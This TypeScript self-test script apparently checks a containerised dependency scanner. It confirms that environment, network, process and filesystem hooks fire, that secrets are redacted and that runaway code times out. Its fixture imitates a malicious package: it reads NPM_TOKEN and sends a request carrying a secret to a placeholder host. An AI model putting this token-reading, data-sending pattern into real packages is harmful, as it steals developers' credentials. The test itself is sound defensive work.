import assert from "node:assert/strict";
import { runtimeConfiguration } from "../src/lib/runtime/policy";
import {
  checkDocker,
  runProbe,
  ContainerCleanupError,
} from "../src/lib/runtime/docker";
import { acquireRuntimeLock } from "../src/lib/runtime/storage";
import { probeSnapshot } from "../src/tests/helpers/runtime-fixtures";

async function main() {
  const { imageId } = runtimeConfiguration(process.env);
  await checkDocker(imageId);
  const release = await acquireRuntimeLock();
  let retainLock = false;
  try {
    const baseline = await runProbe(probeSnapshot(), imageId);
    assert.equal(baseline.status, "completed", baseline.reason);
    const fixture = await runProbe(
      probeSnapshot(`
      const fs = require('node:fs');
      const token = process.env.NPM_TOKEN;
      console.log(token);
      try { fetch('https://fixture.invalid/private?secret=not-exported'); } catch {}
      try { require('node:child_process').execSync('echo fixture'); } catch {}
      fs.writeFileSync('/tmp/dependencyguard-fixture', 'synthetic');
      module.exports = true;
    `),
      imageId,
    );
    assert.equal(fixture.status, "completed", fixture.reason);
    for (const category of ["environment", "network", "process", "filesystem"])
      assert.ok(
        fixture.events.some((event) => event.category === category),
        `Missing ${category} hook`,
      );
    assert.ok(!JSON.stringify(fixture).includes("not-exported"));
    assert.ok(!JSON.stringify(fixture).includes("DEPENDENCYGUARD_SYNTHETIC"));
    const loop = await runProbe(probeSnapshot("while (true) {}"), imageId);
    assert.equal(loop.status, "timed_out");
    console.log(
      "Container self-test passed: import, four hook categories, redaction, time limit, and container cleanup.",
    );
  } catch (error) {
    retainLock = error instanceof ContainerCleanupError;
    throw error;
  } finally {
    if (!retainLock) await release();
  }
}
main().catch((error) => {
  console.error(
    error instanceof Error ? error.message : "Container self-test failed.",
  );
  process.exitCode = 1;
});
